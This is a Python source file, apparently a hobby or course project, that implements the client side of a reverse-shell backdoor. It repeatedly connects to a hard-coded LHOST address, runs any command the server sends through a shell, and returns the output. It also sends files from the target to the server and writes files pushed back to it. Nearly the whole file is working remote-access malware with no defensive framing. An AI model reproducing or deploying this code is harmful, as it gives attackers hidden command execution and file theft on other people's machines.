import socket
import time
import json
import subprocess
import os


# json dumps the desired command, encodes it, and then sends it to the SERVER via socket's send function.
def reliable_send(data):
    jsondata = json.dumps(data)
    so.send(jsondata.encode())


# Uses socket's recv function to grab 1024 bites of data at a time from TARGET and adds to data variable
def reliable_recieve():
    data = ''
    while True:
        try:
            # Decodes and right-strips the encoded data, before its re-encoded.
            data = data + so.recv(1024).decode().rstrip()
            # Returns json formatted data
            return json.loads(data)
        except ValueError:
            continue


# Attempt to connect to LHOST server on LPORT every 20 seconds until successful connection.
def connection():
    while True:
        time.sleep(20)
        try:
            so.connect(('192.168.0.21', 5555))
            shell()
            so.close()
            break
        except:
            connection()


# A function to upload files to the LHOST server.
def upload_file(file_name):
    # Assign file object to store file content - READ bits privilege.
    fo = open(file_name, 'rb')
    so.send(fo.read())


def download_file(file_name):
    # Assign file object to store file content - WRITE bits privilege.
    fo = open(file_name, 'wb')
    # Sets timeout in case download becomes hung, avoiding crash.
    so.settimeout(1)
    # Assign chunks of data that will be received multiple times. - 1024 bites per chunk.
    chunk = so.recv(1024)
    # Continues to add to the chunk variable until there is no remaining data left in the file being sent.
    while chunk:
        fo.write(chunk)
        try:
            chunk = so.recv(1024)
        except socket.timeout as e:
            break
    so.settimeout(None)
    fo.close()


def shell():
    while True:
        # Receives desired command sent by the server.
        command = reliable_recieve()
        if command.lower() == 'quit':
            break
        # Adds change directory command by slicing only first 3 characters in the string "cd "
        elif command[:3].lower() == 'cd ':
            # Finds what directory to change into based on what is entered after the initial 3 character "cd ".
            os.chdir(command[3:])
        # Add 'clear' command.
        elif command.lower() == 'clear':
            pass
        # Adding the download command which uploads the file from the TARGET to the LHOST server.
        elif command[:8].lower() == 'download':
            upload_file(command[9:])
        # Assigns the 'upload' command which downloads the file from the LHOST server to the TARGET.
        elif command[:6].lower() == 'upload':
            download_file(command[7:])
        # Execute commands.
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            # Decodes the already encoded data, before it gets encoded again in the reliable_send function.
            result = result.decode()
            reliable_send(result)


# Initiating socket object; specifying connection over IPv4, using TCP connection.
so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
